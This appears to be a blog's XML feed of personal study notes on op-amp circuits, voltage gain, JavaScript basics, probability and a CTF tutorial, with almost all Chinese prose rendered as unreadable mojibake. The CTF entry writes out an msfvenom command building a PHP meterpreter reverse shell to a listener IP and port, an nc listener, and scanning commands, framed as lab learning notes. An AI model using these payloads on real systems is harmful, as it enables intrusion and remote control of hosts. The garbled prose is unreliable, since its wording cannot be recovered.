src="/../img/current_flow_is_eauql.png"></p><p>ç”±äºç”µæµä¸ä¼šæµè¿‡æ”¾å¤§å™¨çš„è¾“å…¥ç«¯ï¼Œæµè¿‡ç¬¬ä¸€ä¸ªç”µé˜»çš„ç”µæµå€¼ä¸€å®šå’Œæµè¿‡ç¬¬äºŒä¸ªç”µé˜»çš„ç›¸åŒ. æ¯ä¸ªç”µé˜»çš„å‹é™ç­‰äº $RI$.</p><p>ä»è¿™ä¸ªå›¾ä¸­:<br><img src="/../img/big_resistance_in_negative_feedback.png"></p><p>è‹¥ R2 æ˜¯ä¸€ä¸ªå¤§ç”µé˜»ï¼Œé‚£ä¹ˆ Vout è¾“å‡ºç”µå‹åŸºæœ¬éƒ½ä¼šè¢«è¿™ä¸ªå¤§ç”µé˜»åˆ†å‹. å› æ­¤ R2 çš„ç”µå‹åŸºæœ¬ç­‰äºè¾“å‡ºç”µå‹.<br>$$<br>\because I_{in} &#x3D; \frac{V_{in}}{R1} \newline<br>-V_{out} &#x3D; I_{in} R2 \newline<br>\therefore V_{output} &#x3D; - \frac{V_{in}}{R1} \times R2 &#x3D; - \frac{R2}{R1} V_{in}<br>$$</p><p>æ³¨æ„è¿™é‡Œçš„è¾“å‡ºç”µå‹ä¸ºè´Ÿçš„ï¼Œå› ä¸ºè¾“å…¥ç”µå‹ Input Voltage æ˜¯è¿æ¥åœ¨ â€œ-â€œ è¾“å…¥ç«¯.</p><p>å¦‚æœè¦è®©è¾“å‡ºç”µå‹ä¸ºæ­£ï¼Œåˆ™éœ€è¦æ”¹å˜è¾“å…¥ç”µå‹çš„ä½ç½®åˆ° â€œ+â€ è¾“å…¥ç«¯.<br><img src="/../img/make_output_voltage_positive_in_ope_amp.png"></p><p>æ­¤æ—¶:<br>$$<br>I &#x3D; \frac{V_{input}}{R_1} \newline<br>V_{output} &#x3D; I \times (R_1 + R_2) \newline<br>V_{output} &#x3D; (1 + \frac{R_2}{R_1}) \times V_{input}<br>$$</p><p>è¾“å‡ºç”µå‹æ˜¯æ‰€æœ‰è¾“å…¥ç”µå‹çš„æ€»å’Œ:<br><img src="/../img/output_voltages_is_the_sum_of_all_the_input_voltages_in_ope_amp.png"></p><h2 id="ç§¯åˆ†è¿ç®—"><a href="#ç§¯åˆ†è¿ç®—" class="headerlink" title="ç§¯åˆ†è¿ç®—"></a>ç§¯åˆ†è¿ç®—</h2><p>ä¸€ä¸ªç”µé˜»å’Œç”µå®¹å¦‚ä¸‹:<br><img src="/../img/integral_of_ope_amp.png"></p><blockquote><p>è®¡ç®—å¦‚ä¸‹:</p></blockquote><p>$$<br>\frac{V_{input}}{R} &#x3D; I &#x3D; -C \times \frac{dV_{output}}{dt} \newline~<br>\newline<br>V_{output} &#x3D; - \frac{1}{RC} \int V_{input}dt<br>$$</p><h2 id="å¾®åˆ†è¿ç®—"><a href="#å¾®åˆ†è¿ç®—" class="headerlink" title="å¾®åˆ†è¿ç®—"></a>å¾®åˆ†è¿ç®—</h2><p>äº¤æ¢ç”µé˜»å’Œç”µå®¹çš„ä½ç½®:<br><img src="/../img/output_voltage_is_the_differential_of_the_input_voltage_ope_amp.png"></p><blockquote><p>è®¡ç®—å¦‚ä¸‹:<br>$$<br>C \times \frac{dV_{input}}{dt} &#x3D; I &#x3D; - \frac{V_output}{R} \newline~<br>V_{output} &#x3D; - RC \times \frac{dV_{input}}{dt}<br>$$</p></blockquote><h2 id="å……å½“ç¼“å†²å™¨ä½¿ç”¨"><a href="#å……å½“ç¼“å†²å™¨ä½¿ç”¨" class="headerlink" title="å……å½“ç¼“å†²å™¨ä½¿ç”¨"></a>å……å½“ç¼“å†²å™¨ä½¿ç”¨</h2><p>è¿™ç§æƒ…å†µä¸‹ï¼Œè¾“å‡ºç”µå‹æ°å¥½ç­‰äºè¾“å…¥ç”µå‹:<br><img src="/../img/output_voltage_equal_to_input_voltage_ope_amp.png"></p><h1 id="åå‘æ”¾å¤§å™¨"><a href="#åå‘æ”¾å¤§å™¨" class="headerlink" title="åå‘æ”¾å¤§å™¨"></a>åå‘æ”¾å¤§å™¨</h1><p>Inverting amplifier, å› ä¸ºè¾“å‡ºç”µå‹å’Œè¾“å…¥ç”µå‹ç¬¦å·ç›¸åï¼Œæ‰€ä»¥ä¸º Inverting, åå‘æ”¾å¤§å™¨.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯ç”µå‹å¢ç›Š</title>
    <link href="/2022/11/25/%E4%BB%80%E4%B9%88%E6%98%AF%E7%94%B5%E5%8E%8B%E5%A2%9E%E7%9B%8A/"/>
    <url>/2022/11/25/%E4%BB%80%E4%B9%88%E6%98%AF%E7%94%B5%E5%8E%8B%E5%A2%9E%E7%9B%8A/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.eefocus.com/e/511580">å‚è€ƒ</a></p><p>voltage gain, ç”µå‹å¢ç›Šï¼Œè¿™ä¸ªå¢å’Œç›Šéƒ½æ˜¯å¢åŠ çš„æ„æ€ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£ä¸ºç”µå‹çš„æ”¾å¤§å€æ•°ï¼Œä½†è¿™ä¸ªå€æ•°ä¸ä¸€å®šæ¯”ä¸€å¤§ï¼Œæ‰€ä»¥ç”µå‹å®é™…ä¸Šå¯èƒ½ä¼šå˜å°.</p><p>ç”µå‹å¢ç›Šç”¨æ¥æè¿°æ”¾å¤§ç”µè·¯å¯¹è¾“å…¥ä¿¡å·çš„æ”¾å¤§èƒ½åŠ›.</p><p>è®¡ç®—å…¬å¼ä¸º:<br>$$<br>GAIN &#x3D; 20 \times \log_{10}\left\vert \frac{U_o}{U_i} \right\vert<br>$$</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nvim-ä¸­-perl-çš„-language-server-å»ºç«‹</title>
    <link href="/2022/11/25/nvim-%E4%B8%AD-perl-%E7%9A%84-language-server-%E5%BB%BA%E7%AB%8B/"/>
    <url>/2022/11/25/nvim-%E4%B8%AD-perl-%E7%9A%84-language-server-%E5%BB%BA%E7%AB%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://climatechangechat.com/setting_up_lsp_nvim-lspconfig_and_perl_in_neovim.html">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Nvim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF-Bç«™æ•™ç¨‹</title>
    <link href="/2022/11/23/CTF-B%E7%AB%99%E6%95%99%E7%A8%8B/"/>
    <url>/2022/11/23/CTF-B%E7%AB%99%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV19S4y1S7o2/?p=3&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h2 id="ä¸»æœºå‘ç°å·¥å…·"><a href="#ä¸»æœºå‘ç°å·¥å…·" class="headerlink" title="ä¸»æœºå‘ç°å·¥å…·"></a>ä¸»æœºå‘ç°å·¥å…·</h2><p>å‡ ä¸ªå‘½ä»¤è¡Œå·¥å…·: </p><ul><li><code>arp-scan</code></li><li><code>netdiscover</code></li><li><code>fping</code></li></ul><p>å¿«é€Ÿæ‰«æå±€åŸŸç½‘å¯ä»¥ç”¨: <code>arp-scan -l</code></p><h2 id="ç«¯å£æ‰«æå·¥å…·"><a href="#ç«¯å£æ‰«æå·¥å…·" class="headerlink" title="ç«¯å£æ‰«æå·¥å…·"></a>ç«¯å£æ‰«æå·¥å…·</h2><p>ä½¿ç”¨ <code>nmap</code> å‘½ä»¤, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nmap -sS -sV -p- -v -T4 é¶æœºIP<br></code></pre></td></tr></table></figure><p>å‚æ•°:<br><img src="/../img/parameters_of_nmap.png"></p><p>3306 ä¸€èˆ¬æ˜¯ mysql æœåŠ¡.</p><p>æµè§ˆå™¨çš„ Wappalyzer æ’ä»¶å¯ä»¥è·å¾—å¾ˆå¤šä¿¡æ¯.</p><h2 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h2><p>å‘½ä»¤è¡Œå·¥å…·:</p><ul><li><code>dirb</code></li><li><code>dirbuster</code></li></ul><p>å¦‚ä½¿ç”¨ <code>dirb</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ dirb + url<br></code></pre></td></tr></table></figure><h2 id="ä¿®æ”¹-root-å¯†ç "><a href="#ä¿®æ”¹-root-å¯†ç " class="headerlink" title="ä¿®æ”¹ root å¯†ç "></a>ä¿®æ”¹ root å¯†ç </h2><h2 id="åå¼¹-shell"><a href="#åå¼¹-shell" class="headerlink" title="åå¼¹ shell"></a>åå¼¹ shell</h2><p>å¦‚ç”¨ <code>msfvenom</code> å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.70.216 LPORT=4444 -o Desctop/shell.php<br></code></pre></td></tr></table></figure><h2 id="è·å–-shell"><a href="#è·å–-shell" class="headerlink" title="è·å– shell"></a>è·å– shell</h2><p>ä½¿ç”¨ <code>netcat</code> è¿™ä¸ªå‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nc -nlvp 4444<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>whoami</code> æŸ¥çœ‹å½“å‰æƒé™.</p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ä¸»è¦å°±æ˜¯ä¸Šä¼ æœ‰å®³è„šæœ¬è®©ç›®æ ‡ä¸»æœºæ‰§è¡Œ.</p><p>è®¿é—®ç›®æ ‡ä¸»æœºä¸Šçš„ä¸å­˜åœ¨é¡µé¢ï¼Œä½¿å…¶è§¦å‘æ‰§è¡Œ 404 çš„ä»£ç .</p><p>æ„Ÿè§‰éœ€è¦äº†è§£ç°æœ‰çš„æ¼æ´ï¼Œç„¶åæŸ¥çœ‹ç›®æ ‡ä¸»æœºä¸Šæ˜¯å¦å­˜åœ¨.</p><p>é˜²å¾¡æ–¹æ³•ï¼Œé¿å…å¸¸è§åŠé»˜è®¤çš„è·¯å¾„åï¼Œç”¨æˆ·å. å®æ—¶äº†è§£æœ€æ–°æ¼æ´.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç­‰å¯èƒ½æ¦‚å‹çš„é€‚ç”¨æƒ…å†µ</title>
    <link href="/2022/11/23/%E7%AD%89%E5%8F%AF%E8%83%BD%E6%A6%82%E5%9E%8B%E7%9A%84%E9%80%82%E7%94%A8%E6%83%85%E5%86%B5/"/>
    <url>/2022/11/23/%E7%AD%89%E5%8F%AF%E8%83%BD%E6%A6%82%E5%9E%8B%E7%9A%84%E9%80%82%E7%94%A8%E6%83%85%E5%86%B5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/277108286/answer/392215203">å‚è€ƒ</a></p><p>ç­‰å¯èƒ½æ¦‚å‹éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶:</p><ol><li>æ ·æœ¬ç©ºé—´ä¸­çš„æ ·æœ¬ç‚¹æœ‰é™</li><li>æ ·æœ¬ç‚¹å‡ºç°çš„æ¦‚ç‡ç›¸åŒ</li></ol>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-å¯¹è¯ç³»ç»Ÿ-Notes</title>
    <link href="/2022/11/22/Godot-%E5%AF%B9%E8%AF%9D%E7%B3%BB%E7%BB%9F-Notes/"/>
    <url>/2022/11/22/Godot-%E5%AF%B9%E8%AF%9D%E7%B3%BB%E7%BB%9F-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1y64y127n5/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><p><a href="https://bakudas.itch.io/generic-rpg-pack">ç´ æ</a></p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript-é«˜çº§ç¨‹åºè®¾è®¡-Notes</title>
    <link href="/2022/11/22/JavaScript-%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-Notes/"/>
    <url>/2022/11/22/JavaScript-%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬1ç« -ä»€ä¹ˆæ˜¯-JavaScript"><a href="#ç¬¬1ç« -ä»€ä¹ˆæ˜¯-JavaScript" class="headerlink" title="ç¬¬1ç«  ä»€ä¹ˆæ˜¯ JavaScript"></a>ç¬¬1ç«  ä»€ä¹ˆæ˜¯ JavaScript</h1><h2 id="1-2-JavaScript-å®ç°"><a href="#1-2-JavaScript-å®ç°" class="headerlink" title="1.2 JavaScript å®ç°"></a>1.2 JavaScript å®ç°</h2><p>JavaScript å’Œ ECMAScript åŸºæœ¬ä¸Šæ˜¯åŒä¹‰è¯.</p><p>åŒ…æ‹¬çš„éƒ¨åˆ†:<br><img src="/../img/construct_of_JavaScript.png"></p><h3 id="1-2-1-ECMAScript"><a href="#1-2-1-ECMAScript" class="headerlink" title="1.2.1 ECMAScript"></a>1.2.1 ECMAScript</h3><p>ECMAScript æ˜¯ ECMA-262 å®šä¹‰çš„è¯­è¨€ï¼Œå¹¶ä¸å±€é™äº Web æµè§ˆå™¨. è¿™é—¨è¯­è¨€æ²¡æœ‰è¾“å…¥å’Œè¾“å‡ºä¹‹ç±»çš„æ–¹æ³•.</p><p>ECMAScript åªæ˜¯å¯¹å®ç°è¿™ä¸ªè§„èŒƒæè¿°çš„æ‰€æœ‰æ–¹é¢çš„ä¸€é—¨è¯­è¨€çš„ç§°å‘¼. è§„èŒƒåŒ…æ‹¬:</p><p><img src="/../img/rule_of_ECMAScript.png"></p><h3 id="1-2-2-DOM"><a href="#1-2-2-DOM" class="headerlink" title="1.2.2 DOM"></a>1.2.2 DOM</h3><p>DOM æ˜¯ Document Object Modelï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ç®€ç§°. æ˜¯ä¸€ä¸ªåº”ç”¨ç¼–ç¨‹æ¥å£ (API), ç”¨äºåœ¨ HTML ä¸­ä½¿ç”¨æ‰©å±•çš„ XML.</p><p>DOM é€šè¿‡åˆ›å»ºè¡¨ç¤ºæ–‡æ¡£çš„æ ‘ï¼Œè®©å¼€å‘è€…å¯ä»¥éšå¿ƒæ‰€æ¬²æ§åˆ¶ç½‘é¡µçš„å†…å®¹å’Œç»“æ„:<br><img src="/../img/DOM_tree_structure.png"></p><p>DOM å¹¶éåªèƒ½é€šè¿‡ JavaScript è®¿é—®, å…¶ä»–å¾ˆå¤šè¯­è¨€éƒ½å®ç°äº†.</p><p>æ”¯æŒ DOM å¯¹æµè§ˆå™¨å‚å•†æä¸ºé‡è¦.</p><h3 id="1-2-3-BOM"><a href="#1-2-3-BOM" class="headerlink" title="1.2.3 BOM"></a>1.2.3 BOM</h3><p>BOM æ˜¯ Browser Object Model çš„ç¼©å†™. ä¹Ÿæ˜¯ä¸€ä¸ª API, ç”¨äºæ”¯æŒè®¿é—®å’Œæ“ä½œæµè§ˆå™¨çš„çª—å£.</p><h2 id="JavaScript-ç‰ˆæœ¬"><a href="#JavaScript-ç‰ˆæœ¬" class="headerlink" title="JavaScript ç‰ˆæœ¬"></a>JavaScript ç‰ˆæœ¬</h2><h1 id="ç¬¬2ç« -HTML-ä¸­çš„-JavaScript"><a href="#ç¬¬2ç« -HTML-ä¸­çš„-JavaScript" class="headerlink" title="ç¬¬2ç«  HTML ä¸­çš„ JavaScript"></a>ç¬¬2ç«  HTML ä¸­çš„ JavaScript</h1><h2 id="lt-script-gt-å…ƒç´ "><a href="#lt-script-gt-å…ƒç´ " class="headerlink" title="&lt;script&gt; å…ƒç´ "></a><code>&lt;script&gt;</code> å…ƒç´ </h2><p><code>&lt;script&gt;</code> å…ƒç´ æœ‰å…«ä¸ªå±æ€§:<br><img src="/../img/script_attributes1.png"><br><img src="/../img/script_attributes2.png"></p><p>ä¸¤ç§ä½¿ç”¨ <code>&lt;script&gt;</code> çš„æ–¹æ³•:</p><ul><li>å°†ä»£ç æ”¾åœ¨ <code>&lt;script&gt;</code> å…ƒç´ ä¸­ (åœ¨ <code>&lt;script&gt;</code> å…ƒç´ ä¸­çš„ä»£ç è¢«è®¡ç®—å®Œæˆä¹‹å‰ï¼Œé¡µé¢çš„å…¶ä»–å†…å®¹ä¸ä¼šè¢«åŠ è½½ï¼Œä¹Ÿä¸ä¼šè¢«æ˜¾ç¤º)</li><li>ä½¿ç”¨ <code>src</code> å±æ€§æ¥åŒ…å«å¤–éƒ¨æ–‡ä»¶ä¸­çš„ JavaScript<br>å¦‚:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>æ³¨æ„ï¼Œå¤–éƒ¨ JavaScript æ–‡ä»¶çš„æ‰©å±•åæ˜¯ <code>.js</code>, è¿™æ˜¯ä¸éœ€è¦çš„ï¼Œå› ä¸ºæµè§ˆå™¨ä¸ä¼šæ£€æŸ¥æ‰€åŒ…å« JavaScript æ–‡ä»¶çš„æ‰©å±•å.</p><p>ä½¿ç”¨äº† <code>src</code> å±æ€§çš„ <code>&lt;script&gt;</code> å…ƒç´ ä¸åº”è¯¥å†åœ¨ <code>&lt;script&gt;</code> å’Œ <code>&lt;/script&gt;</code> æ ‡ç­¾ä¸­å†åŒ…å«å…¶ä»– JavaScript ä»£ç ï¼Œä¸ç„¶è¡Œå†…ä»£ç ä¼šè¢«å¿½ç•¥.</p><h3 id="2-11-æ ‡ç­¾ä½ç½®"><a href="#2-11-æ ‡ç­¾ä½ç½®" class="headerlink" title="2.11 æ ‡ç­¾ä½ç½®"></a>2.11 æ ‡ç­¾ä½ç½®</h3><p>ç°ä»£ Web åº”ç”¨ç¨‹åºé€šå¸¸å°†æ‰€æœ‰ JavaScript å¼•ç”¨æ”¾åœ¨ <code>&lt;body&gt;</code> å…ƒç´ ä¸­é¡µé¢å†…å®¹åé¢:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Example HTML Page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example1.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example2.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-1-2-æ¨è¿Ÿæ‰§è¡Œè„šæœ¬"><a href="#2-1-2-æ¨è¿Ÿæ‰§è¡Œè„šæœ¬" class="headerlink" title="2.1.2  æ¨è¿Ÿæ‰§è¡Œè„šæœ¬"></a>2.1.2  æ¨è¿Ÿæ‰§è¡Œè„šæœ¬</h3><p>æ”¾åœ¨é¡µé¢åº•éƒ¨æ¯”è¾ƒå¥½. <code>defer</code> å±æ€§å¯èƒ½ä¼šè¢«å¿½ç•¥.</p><h3 id="2-1-3-å¼‚æ­¥æ‰§è¡Œè„šæœ¬"><a href="#2-1-3-å¼‚æ­¥æ‰§è¡Œè„šæœ¬" class="headerlink" title="2.1.3 å¼‚æ­¥æ‰§è¡Œè„šæœ¬"></a>2.1.3 å¼‚æ­¥æ‰§è¡Œè„šæœ¬</h3><p><code>async</code> å±æ€§å’Œ <code>defer</code> ç±»ä¼¼. ä¸¤è€…éƒ½åªé€‚ç”¨äºå¤–éƒ¨è„šæœ¬.</p><p>æ ‡è®°ä¸º <code>async</code> çš„è„šæœ¬å¹¶ä¸èƒ½ä¿è¯èƒ½æŒ‰ç…§å®ƒä»¬å‡ºç°çš„æ¬¡åºæ‰§è¡Œ.</p><p><code>async</code> å±æ€§å‘Šè¯‰æµè§ˆå™¨ï¼Œä¸å¿…ç­‰è„šæœ¬ä¸‹è½½å’Œæ‰§è¡Œå®Œåå†åŠ è½½é¡µé¢, åŒæ ·ä¹Ÿä¸å¿…ç­‰åˆ°è¯¥å¼‚æ­¥è„šæœ¬ä¸‹è½½å’Œæ‰§è¡Œååœ¨åŠ è½½å…¶ä»–è„šæœ¬.</p><h3 id="2-1-4-åŠ¨æ€åŠ è½½è„šæœ¬"><a href="#2-1-4-åŠ¨æ€åŠ è½½è„šæœ¬" class="headerlink" title="2.1.4 åŠ¨æ€åŠ è½½è„šæœ¬"></a>2.1.4 åŠ¨æ€åŠ è½½è„šæœ¬</h3><p>å‘ DOM ä¸­åŠ¨æ€æ·»åŠ  <code>script</code> å…ƒç´ åŒæ ·å¯ä»¥åŠ è½½æŒ‡å®šçš„è„šæœ¬.</p><h3 id="2-1-5-XHTML-ä¸­çš„å˜åŒ–"><a href="#2-1-5-XHTML-ä¸­çš„å˜åŒ–" class="headerlink" title="2.1.5 XHTML ä¸­çš„å˜åŒ–"></a>2.1.5 XHTML ä¸­çš„å˜åŒ–</h3><p>XHTML, Extensible HyperText Markup Languageï¼Œå¯æ‰©å±•è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ˜¯å°† HTML ä½œä¸º XML çš„åº”ç”¨é‡æ–°åŒ…è£…çš„ç»“æœ.</p><p>åœ¨ XHTML ä¸­ä½¿ç”¨ JavaScript å¿…é¡»æŒ‡å®š <code>type</code> å±æ€§ä¸”å€¼ä¸º <code>text/javascript</code>.</p><h3 id="2-1-6-åºŸå¼ƒçš„è¯­æ³•"><a href="#2-1-6-åºŸå¼ƒçš„è¯­æ³•" class="headerlink" title="2.1.6 åºŸå¼ƒçš„è¯­æ³•"></a>2.1.6 åºŸå¼ƒçš„è¯­æ³•</h3><h2 id="2-2-è¡Œå†…ä»£ç ä¸å¤–éƒ¨æ–‡ä»¶"><a href="#2-2-è¡Œå†…ä»£ç ä¸å¤–éƒ¨æ–‡ä»¶" class="headerlink" title="2.2 è¡Œå†…ä»£ç ä¸å¤–éƒ¨æ–‡ä»¶"></a>2.2 è¡Œå†…ä»£ç ä¸å¤–éƒ¨æ–‡ä»¶</h2><p>é€šå¸¸è®¤ä¸ºæœ€ä½³å®è·µæ˜¯å°½å¯èƒ½å°† JavaScript ä»£ç æ”¾åˆ°å¤–éƒ¨æ–‡ä»¶ä¸­.</p><h2 id="2-3-æ–‡æ¡£æ¨¡å¼"><a href="#2-3-æ–‡æ¡£æ¨¡å¼" class="headerlink" title="2.3 æ–‡æ¡£æ¨¡å¼"></a>2.3 æ–‡æ¡£æ¨¡å¼</h2><p>ä½¿ç”¨ <code>doctype</code> åˆ‡æ¢æ–‡æ¡£æ¨¡å¼.</p><p>ä¸‰ç§æ–‡æ¡£æ¨¡å¼:</p><ul><li>æ··æ‚æ¨¡å¼ (quirks mode)</li><li>æ ‡å‡†æ¨¡å¼ (standards mode)</li><li>å‡†æ ‡å‡†æ¨¡å¼ (almost standards mode)</li></ul><h2 id="2-4-lt-noscript-gt-å…ƒç´ "><a href="#2-4-lt-noscript-gt-å…ƒç´ " class="headerlink" title="2.4 &lt;noscript&gt; å…ƒç´ "></a>2.4 <code>&lt;noscript&gt;</code> å…ƒç´ </h2><h1 id="ç¬¬3ç« -è¯­è¨€åŸºç¡€"><a href="#ç¬¬3ç« -è¯­è¨€åŸºç¡€" class="headerlink" title="ç¬¬3ç«  è¯­è¨€åŸºç¡€"></a>ç¬¬3ç«  è¯­è¨€åŸºç¡€</h1><h2 id="3-1-è¯­æ³•"><a href="#3-1-è¯­æ³•" class="headerlink" title="3.1 è¯­æ³•"></a>3.1 è¯­æ³•</h2><h3 id="3-1-1-åŒºåˆ†å¤§å°å†™"><a href="#3-1-1-åŒºåˆ†å¤§å°å†™" class="headerlink" title="3.1.1 åŒºåˆ†å¤§å°å†™"></a>3.1.1 åŒºåˆ†å¤§å°å†™</h3><h3 id="3-1-2-æ ‡è¯†ç¬¦"><a href="#3-1-2-æ ‡è¯†ç¬¦" class="headerlink" title="3.1.2 æ ‡è¯†ç¬¦"></a>3.1.2 æ ‡è¯†ç¬¦</h3><h3 id="3-1-3-æ³¨é‡Š"><a href="#3-1-3-æ³¨é‡Š" class="headerlink" title="3.1.3 æ³¨é‡Š"></a>3.1.3 æ³¨é‡Š</h3><p>C è¯­è¨€çš„æ³¨é‡Š.</p><h3 id="3-1-4-ä¸¥æ ¼æ¨¡å¼"><a href="#3-1-4-ä¸¥æ ¼æ¨¡å¼" class="headerlink" title="3.1.4 ä¸¥æ ¼æ¨¡å¼"></a>3.1.4 ä¸¥æ ¼æ¨¡å¼</h3><p>æ˜¯ä¸€ç§è§£æå’Œæ‰§è¡Œæ¨¡å‹ï¼Œå°†ä¸è§„èŒƒå†™æ³•æŠ›å‡º.</p><p>å¯¹æ•´ä¸ªè„šæœ¬å¯ç”¨ä¸¥æ ¼æ¨¡å¼ï¼Œåœ¨è„šæœ¬å¼€å¤´åŠ ä¸Šä¸€è¡Œ:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;<br></code></pre></td></tr></table></figure><p>å…¶ä¸ºä¸€æ¡é¢„å¤„ç†æŒ‡ä»¤.</p><p>ä¹Ÿå¯ä»¥å•ç‹¬æŒ‡å®šä¸€ä¸ªå‡½æ•°åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹æ‰§è¡Œ:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&quot;use strict&quot;</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-1-5-è¯­å¥"><a href="#3-1-5-è¯­å¥" class="headerlink" title="3.1.5 è¯­å¥"></a>3.1.5 è¯­å¥</h3><p>ä»¥åˆ†å·ç»“å°¾.</p><p>if è¯­å¥å’Œ C ä¸€æ ·.</p><h2 id="3-2-å…³é”®å­—å’Œä¿ç•™å­—"><a href="#3-2-å…³é”®å­—å’Œä¿ç•™å­—" class="headerlink" title="3.2 å…³é”®å­—å’Œä¿ç•™å­—"></a>3.2 å…³é”®å­—å’Œä¿ç•™å­—</h2><p><img src="/../img/keywords_of_js.png"></p><h2 id="3-3-å˜é‡"><a href="#3-3-å˜é‡" class="headerlink" title="3.3 å˜é‡"></a>3.3 å˜é‡</h2><p>æœ‰ä¸‰ä¸ªå…³é”®å­—å¯ä»¥å£°æ˜å˜é‡: <code>var</code>, <code>const</code> å’Œ <code>let</code>.</p><h3 id="3-3-1-var-å…³é”®å­—"><a href="#3-3-1-var-å…³é”®å­—" class="headerlink" title="3.3.1 var å…³é”®å­—"></a>3.3.1 var å…³é”®å­—</h3><p>ä¸åˆå§‹åŒ–çš„æƒ…å†µä¸‹ï¼Œå˜é‡ä¼šä¿å­˜ä¸€ä¸ªç‰¹æ®Šå€¼ undefined.</p><h4 id="1-var-å£°æ˜ä½œç”¨åŸŸ"><a href="#1-var-å£°æ˜ä½œç”¨åŸŸ" class="headerlink" title="1. var 